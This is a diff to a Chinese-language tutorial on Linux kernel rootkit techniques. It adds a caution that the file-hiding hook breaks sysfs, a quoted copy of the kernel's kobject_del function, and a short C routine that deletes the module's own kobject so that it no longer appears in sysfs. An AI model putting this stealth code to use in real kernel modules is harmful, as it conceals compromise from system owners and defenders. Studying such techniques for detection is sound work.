@@ -594,6 +594,12 @@ static void iterate_dir_before_hooker(struct pt_regs *regs){
 
 ![arbitrary_file_hide](./img/arbitrary_file_hide.png) 
 
+> [!CAUTION]
+> 注意经过测试这里会影响到sysfs文件系统的正常使用,在遍历`/sys/`的时候会调用`kernfs_fop_readdir, filldir64`,
+> 但因为某种原因导致其调用失败
+
+
+
 
 ###  3.3 模块的隐藏
 在使用`insmod`加入模块的时候，实际上会调用`init_module`系统调用，
@@ -693,6 +699,41 @@ static int modules_open(struct inode *inode, struct file *file)
 将模块脱链后除了可以隐藏模块外还可以隐藏用户打印`/proc/kallsyms`文件时的打印,如下
 
 ![module_hidden](./img/module_hidden.png) 
+
+```sh
+/**
+ * kobject_del() - Unlink kobject from hierarchy.
+ * @kobj: object.
+ *
+ * This is the function that should be called to delete an object
+ * successfully added via kobject_add().
+ */
+void kobject_del(struct kobject *kobj)
+{
+	struct kobject *parent;
+
+	if (!kobj)
+		return;
+
+	parent = kobj->parent;
+	__kobject_del(kobj);
+	kobject_put(parent);
+}
+EXPORT_SYMBOL(kobject_del);
+```
+
+因此我们可以使用该函数来达成更完备的隐藏
+```c
+
+static ssize_t sysfs_module_hidden(void){
+    // struct kobject *kobj;
+    kobject_del(&(THIS_MODULE->mkobj.kobj));
+    return 0;
+}
+```
+
+
+![sysfs_module_hidden](./img/sysfs_module_hidden.png) 
 
 # 参考
 [https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3](https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3)
